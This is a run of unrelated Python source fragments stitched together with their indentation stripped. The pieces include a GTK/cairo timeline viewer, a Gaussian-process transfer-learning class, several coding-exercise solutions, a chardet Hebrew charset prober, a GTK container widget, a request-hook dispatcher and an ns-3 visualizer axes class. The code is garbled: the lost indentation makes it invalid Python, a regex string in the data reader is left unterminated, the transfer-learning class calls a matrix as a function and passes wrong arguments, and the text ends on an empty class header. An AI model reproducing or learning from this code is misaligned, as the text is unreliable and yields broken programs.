max_text_height = ctx.text_extents("ABCDEFGHIJKLMNOPQRSTUVWXYZabcedefghijklmnopqrstuvwxyz0123456789")[3]
self.max_text_height = max_text_height
height = max_text_height + 10
self.__height = height
def get_height(self):
return self.__height
def draw(self, ctx):
delta = self.__delta
start = self.__lo - (self.__lo % delta) + delta
end = self.__hi - (self.__hi % delta)
if self.__top == 1:
s = -1
else:
s = 1
ctx.set_source_rgb(0, 0, 0)
ctx.set_line_width(1.0)
ticks = range(int(start), int(end + delta), int(delta))
for x in ticks:
real_x = (x - self.__lo ) * self.__width / (self.__hi - self.__lo)
ctx.move_to(real_x, 0)
ctx.line_to(real_x, 5*s)
ctx.close_path()
ctx.stroke()
(t_y_bearing, t_width, t_height) = ctx.text_extents(str(x))[1:4]
if self.__top:
text_delta = t_height + t_y_bearing
else:
text_delta = -t_y_bearing
ctx.move_to(real_x - t_width / 2, (5 + 5 + text_delta)*s)
ctx.show_text(str(x))
delta /= 10
if delta > 0:
start = self.__lo - (self.__lo % delta) + delta
end = self.__hi - (self.__hi % delta)
for x in range(int(start), int(end + delta), int(delta)):
real_x = (x - self.__lo ) * self.__width / (self.__hi - self.__lo)
ctx.move_to(real_x, 0)
ctx.line_to(real_x, 3*s)
ctx.close_path()
ctx.stroke()
class GraphicRenderer:
def __init__(self, start, end):
self.__start = float(start)
self.__end = float(end)
self.__mid_scale = ScaleRenderer()
self.__mid_scale.set_top()
self.__bot_scale = ScaleRenderer()
self.__bot_scale.set_bounds(start, end)
self.__bot_scale.set_bot()
self.__width = 1
self.__height = 1
def get_width(self):
return self.__width
def get_height(self):
return self.__height
def get_data_rectangle(self):
y_start = self.__top_legend.get_height()
x_start = self.__data.get_data_x_start()
return(x_start, y_start, self.__width - x_start, self.__data.get_height())
def scale_data(self, x):
x_start = self.__data.get_data_x_start()
x_scaled = x / (self.__width - x_start) * (self.__r_end - self.__r_start)
return x_scaled
def get_selection_rectangle(self):
y_start = self.__top_legend.get_height() + self.__data.get_height() + self.__mid_scale.get_height() + 20
y_height = self.__bot_scale.get_height() + 20
x_start = self.__bot_scale.get_position(self.__r_start)
x_end = self.__bot_scale.get_position(self.__r_end)
return(x_start, y_start, x_end - x_start, y_height)
def scale_selection(self, x):
x_scaled = x / self.__width * (self.__end - self.__start)
return x_scaled
def set_range(self, start, end):
s = min(start, end)
e = max(start, end)
start = max(self.__start, s)
end = min(self.__end, e)
self.__r_start = start
self.__r_end = end
self.__data.set_render_range(start, end)
self.__mid_scale.set_bounds(start, end)
self.layout(self.__width, self.__height)
def get_range(self):
return(self.__r_start, self.__r_end)
def set_data(self, data):
self.__data = data
def set_top_legend(self, top_legend):
self.__top_legend = top_legend
def layout(self, width, height):
self.__width = width
self.__height = height
self.__top_legend.layout(width)
top_legend_height = self.__top_legend.get_height()
self.__data.layout(width)
self.__mid_scale.layout(width - self.__data.get_data_x_start())
self.__bot_scale.layout(width)
return
def __x_pixel(self, x, width):
new_x = (x - self.__start) * width / (self.__end - self.__start)
return new_x
def draw(self, ctx):
ctx.save()
ctx.set_source_rgb(1, 1, 1)
ctx.set_operator(cairo.OPERATOR_SOURCE)
ctx.rectangle(0, 0, self.__width, self.__height)
ctx.fill()
ctx.save()
self.__top_legend.draw(ctx)
top_legend_height = self.__top_legend.get_height()
ctx.restore()
ctx.move_to(0, top_legend_height)
ctx.line_to(self.__width, top_legend_height)
ctx.close_path()
ctx.set_line_width(2)
ctx.set_source_rgb(0, 0, 0)
ctx.stroke()
ctx.save()
ctx.translate(0,
top_legend_height)
self.__data.draw(ctx)
ctx.restore()
ctx.save()
ctx.translate(self.__data.get_data_x_start(),
top_legend_height + self.__data.get_height() + self.__mid_scale.get_height())
self.__mid_scale.draw(ctx)
ctx.restore()
height_used = top_legend_height + self.__data.get_height() + self.__mid_scale.get_height()
ctx.move_to(self.__data.get_data_x_start(), height_used)
ctx.rel_line_to(0, -self.__mid_scale.get_height())
ctx.close_path()
ctx.set_source_rgb(0, 0, 0)
ctx.set_line_width(2)
ctx.stroke()
ctx.move_to(0, height_used)
ctx.line_to(self.__width, height_used)
ctx.close_path()
ctx.set_line_width(2)
ctx.set_source_rgb(0, 0, 0)
ctx.stroke()
select_start = self.__bot_scale.get_position(self.__r_start)
select_end = self.__bot_scale.get_position(self.__r_end)
ctx.move_to(0, height_used);
ctx.line_to(self.__data.get_data_x_start(), height_used)
ctx.line_to(select_start, height_used + 20)
ctx.line_to(0, height_used + 20)
ctx.line_to(0, height_used)
ctx.set_source_rgb(0, 0, 0)
ctx.set_line_width(1)
ctx.stroke_preserve()
ctx.set_source_rgb(0.9, 0.9, 0.9)
ctx.fill()
ctx.move_to(self.__width, height_used)
ctx.line_to(self.__width, height_used + 20)
ctx.line_to(select_end, height_used + 20)
ctx.line_to(self.__width, height_used)
ctx.set_source_rgb(0, 0, 0)
ctx.set_line_width(1)
ctx.stroke_preserve()
ctx.set_source_rgb(0.9, 0.9, 0.9)
ctx.fill()
height_used += 20
unused_start = self.__bot_scale.get_position(self.__r_start)
unused_end = self.__bot_scale.get_position(self.__r_end)
unused_height = self.__bot_scale.get_height() + 20
ctx.rectangle(0, height_used,
unused_start,
unused_height)
ctx.rectangle(unused_end,
height_used,
self.__width - unused_end,
unused_height)
ctx.set_source_rgb(0.9, 0.9, 0.9)
ctx.fill()
ctx.move_to(unused_end, height_used)
ctx.line_to(self.__width, height_used)
ctx.line_to(self.__width, height_used + unused_height)
ctx.line_to(0, height_used + unused_height)
ctx.line_to(0, height_used)
ctx.line_to(unused_start, height_used)
ctx.close_path()
ctx.set_line_width(2)
ctx.set_source_rgb(0, 0, 0)
ctx.stroke()
ctx.move_to(unused_start, height_used)
ctx.line_to(unused_end, height_used)
ctx.close_path()
ctx.set_line_width(1)
ctx.set_source_rgb(0.9, 0.9, 0.9)
ctx.stroke()
ctx.save()
ctx.move_to(max(unused_start, 2), height_used)
ctx.rel_line_to(0, unused_height)
ctx.move_to(min(unused_end, self.__width - 2), height_used)
ctx.rel_line_to(0, unused_height)
ctx.set_dash([5], 0)
ctx.set_source_rgb(0, 0, 0)
ctx.set_line_width(1)
ctx.stroke()
ctx.restore()
ctx.save()
ctx.translate(0, height_used)
self.__bot_scale.draw(ctx)
ctx.restore()
class GtkGraphicRenderer(gtk.DrawingArea):
def __init__(self, data):
super(GtkGraphicRenderer, self).__init__()
self.__data = data
self.__moving_left = False
self.__moving_right = False
self.__moving_both = False
self.__moving_top = False
self.__force_full_redraw = True
self.add_events(gtk.gdk.POINTER_MOTION_MASK)
self.add_events(gtk.gdk.BUTTON_PRESS_MASK)
self.add_events(gtk.gdk.BUTTON_RELEASE_MASK)
self.connect("expose_event", self.expose)
self.connect('size-allocate', self.size_allocate)
self.connect('motion-notify-event', self.motion_notify)
self.connect('button-press-event', self.button_press)
self.connect('button-release-event', self.button_release)
def set_smaller_zoom(self):
(start, end) = self.__data.get_range()
self.__data.set_range(start, start + (end - start)*2)
self.__force_full_redraw = True
self.queue_draw()
def set_bigger_zoom(self):
(start, end) = self.__data.get_range()
self.__data.set_range(start, start + (end - start) / 2)
self.__force_full_redraw = True
self.queue_draw()
def output_png(self, filename):
surface = cairo.ImageSurface(cairo.FORMAT_ARGB32,
self.__data.get_width(),
self.__data.get_height())
ctx = cairo.Context(self.__buffer_surface)
self.__data.draw(ctx)
surface.write_to_png(filename)
def button_press(self, widget, event):
(x, y, width, height) = self.__data.get_selection_rectangle()
(d_x, d_y, d_width, d_height) = self.__data.get_data_rectangle()
if event.y > y and event.y < y + height:
if abs(event.x - x) < 5:
self.__moving_left = True
return True
if abs(event.x - (x + width)) < 5:
self.__moving_right = True
return True
if event.x > x and event.x < x + width:
self.__moving_both = True
self.__moving_both_start = event.x
self.__moving_both_cur = event.x
return True
if event.y > d_y and event.y < (d_y + d_height):
if event.x > d_x and event.x < (d_x + d_width):
self.__moving_top = True
self.__moving_top_start = event.x
self.__moving_top_cur = event.x
return True
return False
def button_release(self, widget, event):
if self.__moving_left:
self.__moving_left = False
left = self.__data.scale_selection(self.__moving_left_cur)
right = self.__data.get_range()[1]
self.__data.set_range(left, right)
self.__force_full_redraw = True
self.queue_draw()
return True
if self.__moving_right:
self.__moving_right = False
right = self.__data.scale_selection(self.__moving_right_cur)
left = self.__data.get_range()[0]
self.__data.set_range(left, right)
self.__force_full_redraw = True
self.queue_draw()
return True
if self.__moving_both:
self.__moving_both = False
delta = self.__data.scale_selection(self.__moving_both_cur - self.__moving_both_start)
(left, right) = self.__data.get_range()
self.__data.set_range(left + delta, right + delta)
self.__force_full_redraw = True
self.queue_draw()
return True
if self.__moving_top:
self.__moving_top = False
return False
def motion_notify(self, widget, event):
(x, y, width, height) = self.__data.get_selection_rectangle()
if self.__moving_left:
if event.x <= 0:
self.__moving_left_cur = 0
elif event.x >= x + width:
self.__moving_left_cur = x + width
else:
self.__moving_left_cur = event.x
self.queue_draw_area(0, int(y), int(self.__width), int(height))
return True
if self.__moving_right:
if event.x >= self.__width:
self.__moving_right = self.__width
elif event.x < x:
self.__moving_right_cur = x
else:
self.__moving_right_cur = event.x
self.queue_draw_area(0, int(y), int(self.__width), int(height))
return True
if self.__moving_both:
cur_e = self.__width - (x + width - self.__moving_both_start)
cur_s = (self.__moving_both_start - x)
if event.x < cur_s:
self.__moving_both_cur = cur_s
elif event.x > cur_e:
self.__moving_both_cur = cur_e
else:
self.__moving_both_cur = event.x
self.queue_draw_area(0, int(y), int(self.__width), int(height))
return True
if self.__moving_top:
self.__moving_top_cur = event.x
delta = self.__data.scale_data(self.__moving_top_start - self.__moving_top_cur)
(left, right) = self.__data.get_range()
self.__data.set_range(left + delta, right + delta)
self.__force_full_redraw = True
self.__moving_top_start = event.x
self.queue_draw()
return True
(d_x, d_y, d_width, d_height) = self.__data.get_data_rectangle()
if event.y > y and event.y < y + height:
if abs(event.x - x) < 5 or abs(event.x - (x + width)) < 5:
widget.window.set_cursor(gtk.gdk.Cursor(gtk.gdk.SB_H_DOUBLE_ARROW))
return True
if event.x > x and event.x < x + width:
widget.window.set_cursor(gtk.gdk.Cursor(gtk.gdk.FLEUR))
return True
if event.y > d_y and event.y < (d_y + d_height):
if event.x > d_x and event.x < (d_x + d_width):
widget.window.set_cursor(gtk.gdk.Cursor(gtk.gdk.FLEUR))
return True
widget.window.set_cursor(None)
return False
def size_allocate(self, widget, allocation):
self.__width = allocation.width
self.__height = allocation.height
self.__data.layout(allocation.width, allocation.height)
self.__force_full_redraw = True
self.queue_draw()
def expose(self, widget, event):
if self.__force_full_redraw:
self.__buffer_surface = cairo.ImageSurface(cairo.FORMAT_ARGB32,
self.__data.get_width(),
self.__data.get_height())
ctx = cairo.Context(self.__buffer_surface)
self.__data.draw(ctx)
self.__force_full_redraw = False
ctx = widget.window.cairo_create()
ctx.rectangle(event.area.x, event.area.y,
event.area.width, event.area.height)
ctx.clip()
ctx.set_source_surface(self.__buffer_surface)
ctx.paint()
(x, y, width, height) = self.__data.get_selection_rectangle()
if self.__moving_left:
ctx.move_to(max(self.__moving_left_cur, 2), y)
ctx.rel_line_to(0, height)
ctx.close_path()
ctx.set_line_width(1)
ctx.set_source_rgb(0, 0, 0)
ctx.stroke()
if self.__moving_right:
ctx.move_to(min(self.__moving_right_cur, self.__width - 2), y)
ctx.rel_line_to(0, height)
ctx.close_path()
ctx.set_line_width(1)
ctx.set_source_rgb(0, 0, 0)
ctx.stroke()
if self.__moving_both:
delta_x = self.__moving_both_cur - self.__moving_both_start
left_x = x + delta_x
ctx.move_to(x + delta_x, y)
ctx.rel_line_to(0, height)
ctx.close_path()
ctx.move_to(x + width + delta_x, y)
ctx.rel_line_to(0, height)
ctx.close_path()
ctx.set_source_rgb(0, 0, 0)
ctx.set_line_width(1)
ctx.stroke()
return False
class MainWindow:
def __init__(self):
return
def run(self, graphic):
window = gtk.Window()
self.__window = window
window.set_default_size(200, 200)
vbox = gtk.VBox()
window.add(vbox)
render = GtkGraphicRenderer(graphic)
self.__render = render
vbox.pack_end(render, True, True, 0)
hbox = gtk.HBox()
vbox.pack_start(hbox, False, False, 0)
smaller_zoom = gtk.Button("Zoom Out")
smaller_zoom.connect("clicked", self.__set_smaller_cb)
hbox.pack_start(smaller_zoom)
bigger_zoom = gtk.Button("Zoom In")
bigger_zoom.connect("clicked", self.__set_bigger_cb)
hbox.pack_start(bigger_zoom)
output_png = gtk.Button("Output Png")
output_png.connect("clicked", self.__output_png_cb)
hbox.pack_start(output_png)
window.connect('destroy', gtk.main_quit)
window.show_all()
gtk.main()
def __set_smaller_cb(self, widget):
self.__render.set_smaller_zoom()
def __set_bigger_cb(self, widget):
self.__render.set_bigger_zoom()
def __output_png_cb(self, widget):
dialog = gtk.FileChooserDialog("Output Png", self.__window,
gtk.FILE_CHOOSER_ACTION_SAVE, ("Save", 1))
self.__dialog = dialog
dialog.set_default_response(1)
dialog.connect("response", self.__dialog_response_cb)
dialog.show()
return
def __dialog_response_cb(self, widget, response):
if response == 1:
filename = self.__dialog.get_filename()
self.__render.output_png(filename)
widget.hide()
return
def read_data(filename):
timelines = Timelines()
colors = Colors()
fh = open(filename)
m1 = re.compile('range ([^ ]+) ([^ ]+) ([^ ]+) ([0-9]+) ([0-9]+)')
m2 = re.compile('event-str ([^ ]+) ([^ ]+) ([^ ]+) ([0-9]+)')
m3 = re.compile('event-int ([^ ]+) ([^ ]+) ([0-9]+) ([0-9]+)')
m4 = re.compile('color ([^ ]+)
for line in fh.readlines():
m = m1.match(line)
if m:
line_name = m.group(1)
timeline = timelines.get(m.group(1))
rang = timeline.get_range(m.group(2))
data_range = DataRange()
data_range.value = m.group(3)
data_range.start = int(m.group(4))
data_range.end = int(m.group(5))
rang.add_range(data_range)
continue
m = m2.match(line)
if m:
line_name = m.group(1)
timeline = timelines.get(m.group(1))
ev = timeline.get_event_str(m.group(2))
event = EventString()
event.value = m.group(3)
event.at = int(m.group(4))
ev.add_event(event)
continue
m = m3.match(line)
if m:
line_name = m.group(1)
timeline = timelines.get(m.group(1))
ev = timeline.get_event_int(m.group(2))
event = EventInt()
event.value = int(m.group(3))
event.at = int(m.group(4))
ev.add_event(event)
continue
m = m4.match(line)
if m:
r = int(m.group(2), 16)
g = int(m.group(3), 16)
b = int(m.group(4), 16)
color = Color(r / 255, g / 255, b / 255)
colors.add(m.group(1), color)
continue
timelines.sort()
return (colors, timelines)
def main():
(colors, timelines) = read_data(sys.argv[1])
(lower_bound, upper_bound) = timelines.get_bounds()
graphic = GraphicRenderer(lower_bound, upper_bound)
top_legend = TopLegendRenderer()
range_values = timelines.get_all_range_values()
range_colors = []
for range_value in range_values:
range_colors.append(colors.lookup(range_value))
top_legend.set_legends(range_values,
range_colors)
graphic.set_top_legend(top_legend)
data = TimelinesRenderer()
data.set_timelines(timelines, colors)
graphic.set_data(data)
range_mid = (upper_bound - lower_bound) / 2
range_width = (upper_bound - lower_bound) / 10
range_lo = range_mid - range_width / 2
range_hi = range_mid + range_width / 2
graphic.set_range(range_lo, range_hi)
main_window = MainWindow()
main_window.run(graphic)
main()
import numpy as np
from Kernel import Kernel
import numpy.matlib as Nmat
import numpy.linalg as LA
class GsFace(object):
def __init__(self, X_tar, X_src):
n_src, n_ftr1 = X_src.shape
n_tar, n_ftr2 = X_tar.shape
assert n_ftr1 == n_ftr2, 'the dimension of the X_src and the X_tar is not equal'
n_ftr = n_ftr1
self.theta = np.zeros([n_ftr + 2, 1])
self.X_tar = X_tar
self.X_src = X_src
def P_prior(self, X, K):
n_data, n_ftr = X.shape
return 1 / np.sqrt(((2 * np.pi) ** (n_ftr * n_data)) * (LA.det(K) ** n_ftr)) * np.exp(
-0.5 * (np.trace(K * X * X.T)))
def KFDA_J(self, K, N_p, N_n, q=0):
if q==0:
q = N_p + N_n
a = Nmat.ones([N_p + N_n, 1])
a[0:N_p] = 1 / N_p
a[N_p:] = -1 / N_n
A = Nmat.matrix([np.diag(1 / np.sqrt(N_p) * (Nmat.identity(N_p) - 1 / N_p * Nmat.ones([N_p, N_p]))), \
np.diag(1 / np.sqrt(N_n) * (Nmat.identity(N_n) - 1 / N_n * Nmat.ones([N_n, N_n])))])
Q = K
tmp = 1e8 * Nmat.identity(N_p + N_n) - 1e8 * A * Q * LA.inv(1e8 * Nmat.identity(q) + Q.T * A * A(Q)) * Q.T * A
J = 1/1e-8 * (a.T * K * a - a.T * K * A * tmp * A * K * a)
return J
def P_latent(self, J, delta):
return np.exp(-J / (delta ** 2))
def P_theta(self):
p = 1
for i in range(len(self.theta)):
p = p * self.theta[i]
return p
def P_poster(self, X, K, J, delta):
n_data, n_ftr = X.shape
log_prior = n_ftr / 2 * np.log(LA.det(K)) + 0.5 * np.trace(K * X * X.T)
tmp = 0
for i in range(len(self.theta)):
tmp = tmp + np.log(self.theta[i])
log_theta = tmp
log_latent = -J / (delta ** 2)
return log_prior + log_theta + log_latent
def Gs_model(self, delta, beta, N_ps, N_ns, N_pt, N_nt, q=0):
X_ts = np.append(self.X_tar, self.X_src)
K_t = Kernel(self.X_tar, self.theta)
J_t = self.KFDA_J(K_t, N_pt, N_nt, q)
log_pt = np.log(self.P_poster(self.X_tar, K_t, J_t, delta))
pt = self.P_poster(self.X_tar, K_t, J_t, N_pt, N_nt, q)
K_ts = Kernel(X_ts, self.theta)
J_ts = self.KFDA_J(K_ts, N_ps + N_pt, N_ns + N_nt, q)
log_pts = np.log(self.P_poster(X_ts, K_ts, J_ts, delta))
pts = self.P_poster(X_ts, K_ts, J_ts, N_ps, N_ns, q)
K_s = Kernel(self.X_src, self.theta)
J_s = self.KFDA_J(K_s, N_ps, N_ns, q)
log_ps = np.log(self.P_poster(self.X_src, K_s, J_s, delta))
Lmodl = -log_pt + beta * pt * log_pt + beta * (pts * log_ps - pts * log_pts)
return Lmodl
class Solution:
def hashCode(self, key, HASH_SIZE):
w = 1
ret = 0
for i in xrange(len(key)-1, -1, -1):
ret = (ret+ord(key[i])*w)%HASH_SIZE
w = (w*33)%HASH_SIZE
return ret
if __name__ == "__main__":
assert Solution().hashCode("abcd", 100) == 78
client_common_headers = {
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
"Accept-Encoding": "gzip,deflate,sdch",
"Accept-Language": "en-US,en;q=0.8,zh;q=0.6,zh-CN;q=0.4",
"Cache-Control": "max-age=0",
"Connection": "keep-alive",
"Referer": "https://www.google.com.hk/",
"User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36"
}
import heapq
class Heap(object):
def __init__(self, data=None, key=lambda x: None):
self.heap = data or None
heapq.heapify(self.heap)
self.key = key
def push(self, item):
if self.key:
item = (self.key(item), item)
heapq.heappush(self.heap, item)
def pop(self):
item = heapq.heappop(self.heap)
return item[1] if self.key else item
class Solution:
def heapify(self, A):
n = len(A)
for i in xrange(n/2, -1, -1):
self.heappush(A, i)
def heappush(self, A, i):
n = len(A)
if i >= n:
return
l = 2*i+1
r = 2*i+2
mini = i
if l < n and A[l] < A[mini]:
mini = l
if r < n and A[r] < A[mini]:
mini = r
if i != mini:
A[i], A[mini] = A[mini], A[i]
swapped = mini
self.heappush(A, swapped)
def heapify_error(self, A, i=0):
n = len(A)
if i >= n:
return
l = 2*i+1
r = 2*i+2
mini = i
if l < n and A[l] < A[mini]:
mini = l
if r < n and A[r] < A[mini]:
mini = r
A[i], A[mini] = A[mini], A[i]
self.heapify_error(A, l)
self.heapify_error(A, r)
if __name__ == "__main__":
A = [45, 39, 32, 11]
Solution().heapify(A)
assert A == [11, 39, 32, 45]
from .charsetprober import CharSetProber
from .constants import eNotMe, eDetecting
from .compat import wrap_ord
FINAL_KAF = 0xea
NORMAL_KAF = 0xeb
FINAL_MEM = 0xed
NORMAL_MEM = 0xee
FINAL_NUN = 0xef
NORMAL_NUN = 0xf0
FINAL_PE = 0xf3
NORMAL_PE = 0xf4
FINAL_TSADI = 0xf5
NORMAL_TSADI = 0xf6
MIN_FINAL_CHAR_DISTANCE = 5
MIN_MODEL_DISTANCE = 0.01
VISUAL_HEBREW_NAME = "ISO-8859-8"
LOGICAL_HEBREW_NAME = "windows-1255"
class HebrewProber(CharSetProber):
def __init__(self):
CharSetProber.__init__(self)
self._mLogicalProber = None
self._mVisualProber = None
self.reset()
def reset(self):
self._mFinalCharLogicalScore = 0
self._mFinalCharVisualScore = 0
self._mPrev = ' '
self._mBeforePrev = ' '
def set_model_probers(self, logicalProber, visualProber):
self._mLogicalProber = logicalProber
self._mVisualProber = visualProber
def is_final(self, c):
return wrap_ord(c) in [FINAL_KAF, FINAL_MEM, FINAL_NUN, FINAL_PE,
FINAL_TSADI]
def is_non_final(self, c):
return wrap_ord(c) in [NORMAL_KAF, NORMAL_MEM, NORMAL_NUN, NORMAL_PE]
def feed(self, aBuf):
if self.get_state() == eNotMe:
return eNotMe
aBuf = self.filter_high_bit_only(aBuf)
for cur in aBuf:
if cur == ' ':
if self._mBeforePrev != ' ':
if self.is_final(self._mPrev):
self._mFinalCharLogicalScore += 1
elif self.is_non_final(self._mPrev):
self._mFinalCharVisualScore += 1
else:
if ((self._mBeforePrev == ' ') and
(self.is_final(self._mPrev)) and (cur != ' ')):
self._mFinalCharVisualScore += 1
self._mBeforePrev = self._mPrev
self._mPrev = cur
return eDetecting
def get_charset_name(self):
finalsub = self._mFinalCharLogicalScore - self._mFinalCharVisualScore
if finalsub >= MIN_FINAL_CHAR_DISTANCE:
return LOGICAL_HEBREW_NAME
if finalsub <= -MIN_FINAL_CHAR_DISTANCE:
return VISUAL_HEBREW_NAME
modelsub = (self._mLogicalProber.get_confidence()
- self._mVisualProber.get_confidence())
if modelsub > MIN_MODEL_DISTANCE:
return LOGICAL_HEBREW_NAME
if modelsub < -MIN_MODEL_DISTANCE:
return VISUAL_HEBREW_NAME
if finalsub < 0.0:
return VISUAL_HEBREW_NAME
return LOGICAL_HEBREW_NAME
def get_state(self):
if (self._mLogicalProber.get_state() == eNotMe) and \
(self._mVisualProber.get_state() == eNotMe):
return eNotMe
return eDetecting
class Solution(object):
def __init__(self):
self.delta = [(0, 1), (1, 0), (1, -1)]
def solve(self, cipher):
ret = self.rec(cipher)
if ret:
return "YES"
else:
return "NO"
def rec(self, grid):
changed = False
m = len(grid)
n = len(grid[0])
for i in xrange(m):
for j in xrange(n):
if not changed:
if grid[i][j] == 0:
changed = True
grid[i][j] = 1
for d in self.delta:
i2 = i + d[0]
j2 = j + d[1]
if 0 <= i2 < m and 0 <= j2 < n and grid[i2][j2] == 0:
grid[i2][j2] = 1
if self.rec(grid):
return True
grid[i2][j2] = 0
grid[i][j] = 0
if not changed:
return True
if __name__ == "__main__":
import sys
f = open("1.in", "r")
solution = Solution()
testcases = int(f.readline().strip())
for t in xrange(testcases):
int(f.readline().strip())
cipher = []
for _ in xrange(2):
cipher.append(map(int, list(f.readline().strip())))
s = "%s\n" % (solution.solve(cipher))
print s,
import gtk
import gobject
try:
from gazpacho.widgets.base.base import SimpleContainerAdaptor
except ImportError:
pass
class HIGContainer(gtk.Bin):
__gtype_name__ = 'HIGContainer'
__gproperties__ = {
'title': (str, 'Group Title', 'the group title',
'', gobject.PARAM_READWRITE|gobject.PARAM_CONSTRUCT),
}
def __init__(self, title=None):
self.__title_text = None
gtk.widget_push_composite_child()
self.__title = gobject.new(gtk.Label, visible=True, xalign=0, yalign=0.5)
self.__indent = gobject.new(gtk.Label, visible=True, label='    ')
gtk.widget_pop_composite_child()
gtk.Bin.__init__(self)
self.__title.set_parent(self)
self.__indent.set_parent(self)
if title is not None:
self.props.title = title
def do_size_request(self, requisition):
title_req = gtk.gdk.Rectangle(0, 0, *self.__title.size_request())
indent_req = gtk.gdk.Rectangle(0, 0, *self.__indent.size_request())
if self.child is None:
child_req = gtk.gdk.Rectangle()
else:
child_req = gtk.gdk.Rectangle(0, 0, *self.child.size_request())
requisition.height = (title_req.height + 6 +
max(child_req.height, indent_req.height))
requisition.width = max(title_req.width, indent_req.width + child_req.width)
def do_size_allocate(self, allocation):
self.allocation = allocation
title_req = gtk.gdk.Rectangle(0, 0, *self.__title.get_child_requisition())
title_alloc = gtk.gdk.Rectangle()
title_alloc.x = allocation.x
title_alloc.y = allocation.y
title_alloc.width = min(title_req.width, allocation.width)
title_alloc.height = min(title_req.height, allocation.height)
self.__title.size_allocate(title_alloc)
if self.child is None:
return
indent_req = gtk.gdk.Rectangle(0, 0, *self.__indent.get_child_requisition())
child_req = gtk.gdk.Rectangle(0, 0, *self.child.get_child_requisition())
child_alloc = gtk.gdk.Rectangle()
child_alloc.x = allocation.x + indent_req.width
child_alloc.y = allocation.y + title_alloc.height + 6
child_alloc.width = allocation.width - indent_req.width
child_alloc.height = allocation.height - 6 - title_alloc.height
self.child.size_allocate(child_alloc)
def do_forall(self, internal, callback, data):
if internal:
callback(self.__title, data)
callback(self.__indent, data)
if self.child is not None:
callback(self.child, data)
def do_set_property(self, pspec, value):
if pspec.name == 'title':
self.__title.set_markup('<span weight="bold">%s</span>' %
gobject.markup_escape_text(value))
self.__title_text = value
else:
raise AttributeError, 'unknown property %s' % pspec.name
def do_get_property(self, pspec):
if pspec.name == 'title':
return self.__title_text
else:
raise AttributeError, 'unknown property %s' % pspec.name
if __name__ == '__main__':
frame = gtk.Frame()
group = gobject.new(HIGContainer, title="Hello")
frame.add(group)
check = gtk.CheckButton("foobar")
group.add(check)
w = gtk.Window()
w.add(frame)
w.show_all()
w.connect("destroy", lambda w: gtk.main_quit())
gtk.main()
HOOKS = ['response']
def default_hooks():
hooks = {}
for event in HOOKS:
hooks[event] = []
return hooks
def dispatch_hook(key, hooks, hook_data):
hooks = hooks or dict()
if key in hooks:
hooks = hooks.get(key)
if hasattr(hooks, '__call__'):
hooks = [hooks]
for hook in hooks:
_hook_data = hook(hook_data)
if _hook_data is not None:
hook_data = _hook_data
return hook_data
import goocanvas
import core
import math
import pango
import gtk
class Axes(object):
def __init__(self, viz):
self.viz = viz
self.color = 0x8080C0FF
self.hlines = goocanvas.Path(parent=viz.canvas.get_root_item(), stroke_color_rgba=self.color)
self.hlines.lower(None)
self.vlines = goocanvas.Path(parent=viz.canvas.get_root_item(), stroke_color_rgba=self.color)
self.vlines.lower(None)
self.labels = []
hadj = self.viz.get_hadjustment()
vadj = self.viz.get_vadjustment()
def update(adj):
if self.visible:
self.update_view()
hadj.connect("value-changed", update)
vadj.connect("value-changed", update)
hadj.connect("changed", update)
vadj.connect("changed", update)
self.visible = True
self.update_view()
def set_visible(self, visible):
self.visible = visible
if self.visible:
self.hlines.props.visibility = goocanvas.ITEM_VISIBLE
self.vlines.props.visibility = goocanvas.ITEM_VISIBLE
else:
self.hlines.props.visibility = goocanvas.ITEM_HIDDEN
self.vlines.props.visibility = goocanvas.ITEM_HIDDEN
for label in self.labels:
label.props.visibility = goocanvas.ITEM_HIDDEN
def _compute_divisions(self, xi, xf):
assert xf > xi
dx = xf - xi
size = dx
ndiv = 5
text_width = dx/ndiv/2
def rint(x):
return math.floor(x+0.5)
dx_over_ndiv = dx / ndiv
for n in range(5):
tbe = math.log10(dx_over_ndiv)
div = pow(10, rint(tbe))
if math.fabs(div/2 - dx_over_ndiv) < math.fabs(div - dx_over_ndiv):
div /= 2
elif math.fabs(div*2 - dx_over_ndiv) < math.fabs(div - dx_over_ndiv):
div *= 2
x0 = div*math.ceil(xi / div) - div
if n > 1:
ndiv = rint(size / text_width)
return x0, div
def update_view(self):
if self.viz.zoom is None:
return
unused_labels = self.labels
self.labels = []
for label in unused_labels:
label.set_property("visibility", goocanvas.ITEM_HIDDEN)
def get_label():
try:
label = unused_labels.pop(0)
except IndexError:
label = goocanvas.Text(parent=self.viz.canvas.get_root_item(), stroke_color_rgba=self.color)
else:
label.set_property("visibility", goocanvas.ITEM_VISIBLE)
label.lower(None)
self.labels.append(label)
return label
hadj = self.viz.get_hadjustment()
vadj = self.viz.get_vadjustment()
zoom = self.viz.zoom.value
offset = 10/zoom
x1, y1 = self.viz.canvas.convert_from_pixels(hadj.value, vadj.value)
x2, y2 = self.viz.canvas.convert_from_pixels(hadj.value + hadj.page_size, vadj.value + vadj.page_size)
line_width = 5.0/self.viz.zoom.value
self.hlines.set_property("line-width", line_width)
yc = y2 - line_width/2
sim_x1 = x1/core.PIXELS_PER_METER
sim_x2 = x2/core.PIXELS_PER_METER
x0, xdiv = self._compute_divisions(sim_x1, sim_x2)
path = ["M %r %r L %r %r" % (x1, yc, x2, yc)]
x = x0
while x < sim_x2:
path.append("M %r %r L %r %r" % (core.PIXELS_PER_METER*x, yc - offset, core.PIXELS_PER_METER*x, yc))
label = get_label()
label.set_properties(font=("Sans Serif %f" % int(12/zoom)),
text=("%G" % x),
fill_color_rgba=self.color,
alignment=pango.ALIGN_CENTER,
anchor=gtk.ANCHOR_S,
x=core.PIXELS_PER_METER*x,
y=(yc - offset))
x += xdiv
del x
self.hlines.set_property("data", " ".join(path))
self.vlines.set_property("line-width", line_width)
xc = x1 + line_width/2
sim_y1 = y1/core.PIXELS_PER_METER
sim_y2 = y2/core.PIXELS_PER_METER
y0, ydiv = self._compute_divisions(sim_y1, sim_y2)
path = ["M %r %r L %r %r" % (xc, y1, xc, y2)]
y = y0
while y < sim_y2:
path.append("M %r %r L %r %r" % (xc, core.PIXELS_PER_METER*y, xc + offset, core.PIXELS_PER_METER*y))
label = get_label()
label.set_properties(font=("Sans Serif %f" % int(12/zoom)),
text=("%G" % y),
fill_color_rgba=self.color,
alignment=pango.ALIGN_LEFT,
anchor=gtk.ANCHOR_W,
x=xc + offset,
y=core.PIXELS_PER_METER*y)
y += ydiv
self.vlines.set_property("data", " ".join(path))
self.labels.extend(unused_labels)
class Solution(object):
